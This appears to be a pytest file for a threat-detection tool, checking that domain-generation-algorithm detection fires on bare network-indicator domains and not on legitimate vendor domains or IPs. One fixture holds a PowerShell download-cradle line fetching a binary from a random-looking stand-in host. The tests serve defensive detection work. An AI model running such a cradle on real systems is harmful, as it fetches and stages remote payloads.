"""Network-IOC pipe: a bare DGA domain must be detectable + host-queryable.

extract_network_iocs produces both IPs and domains. The compiler indexed a
domain only by_port (never by_url_host), and match_dga_domain only scanned
URL-structured hosts -- so a BARE domain IOC (no http:// wrapper) was invisible
to DGA detection and not host-queryable. DGA is about domain STRUCTURE alone
(algorithmic generation), independent of any cradle, so it must fire on the
bare domain value. c2_staging_domain still (correctly) requires a download
cradle -- that is the signal, not changed here.

Property-based: the predicate is the host STRING STRUCTURE (entropy / length /
digit-or-consonant runs) + a vendor allowlist, never a domain literal.
"""
from __future__ import annotations

from sift_sentinel.analysis.evidence_db import _c_netioc
from sift_sentinel.analysis.malicious_semantics import (
    match_dga_domain,
)


def _netioc_fact(value, type_="domain", port=443, classification="external"):
    for _i, fact, _err in _c_netioc(
            [{"value": value, "port": port, "type": type_,
              "classification": classification}]):
        return fact
    return None


# ── compiler: domains are now host-indexed ──────────────────────────────

def test_domain_ioc_indexed_by_url_host():
    f = _netioc_fact("evil-staging.example")
    assert "evil-staging.example" in (f.get("index", {}).get("by_url_host") or [])


def test_ip_ioc_still_indexed_by_ip_not_host():
    f = _netioc_fact("203.0.113.55", type_="ip", port=8080)
    idx = f.get("index", {})
    assert idx.get("by_ip") == ["203.0.113.55"]
    assert "by_url_host" not in idx          # an IP is not a host domain


# ── matcher: a bare DGA domain fires ────────────────────────────────────

def test_dga_fires_on_bare_high_entropy_domain():
    assert match_dga_domain(_netioc_fact("x7g2qphnzkw3vbnm9q.top")) is True


def test_dga_no_fire_on_legit_bare_domain():
    for legit in ("google.com", "fonts.gstatic.com", "update.adobe.com",
                  "cdn.cloudflare.net", "microsoft.com"):
        assert match_dga_domain(_netioc_fact(legit)) is False, legit


def test_dga_no_fire_on_ip_ioc():
    assert match_dga_domain(_netioc_fact("203.0.113.55", type_="ip")) is False


def test_dga_still_fires_on_url_structured_host():
    # regression: the original URL-host path still works
    f = {"fact_type": "powershell_command_fact",
         "command": "iwr http://kq3v9z2x8w.info/p.bin"}
    assert match_dga_domain(f) is True


def test_dga_metamorphic_relabel():
    a = match_dga_domain(_netioc_fact("q9z2x8w7kq3v.info"))
    b = match_dga_domain(_netioc_fact("z2x8wq9kq3v7.info"))
    assert a is b is True


def test_dga_does_not_fire_on_non_netioc_value_field():
    # a generic fact with a value that is NOT a domain-typed netioc must not
    # be DGA-scored just because it has a 'value' field
    assert match_dga_domain(
        {"fact_type": "process_fact", "value": "svchost.exe"}) is False
